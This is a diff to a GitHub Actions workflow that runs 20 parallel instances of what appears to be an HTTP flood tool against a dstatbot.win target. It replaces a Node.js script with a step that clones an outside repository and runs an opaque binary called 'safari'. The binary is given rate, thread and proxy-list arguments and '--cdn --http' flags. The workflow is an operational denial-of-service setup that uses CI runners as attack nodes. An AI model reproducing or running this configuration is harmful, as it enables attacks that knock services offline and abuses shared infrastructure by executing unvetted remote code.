@@ -13,21 +13,16 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
     
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Setup Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: '18'
-
-    - name: Install dependencies
+    - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
       run: |
-        npm install puppeteer-real-browser http2 tls url crypto
-
-    - name: Run script (Instance ${{ matrix.instance }})
-      run: |
-        node m.js https://captcha2.dstatbot.win/xRtk19Yb 300 3 3 3
+        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
+        cd cuddly-octo-bassoon
+        chmod +x safari
+        ./safari  https://c2.dstatbot.win/uKdtvPvP   700 10000 8000 proxy.txt --cdn --http 
+    
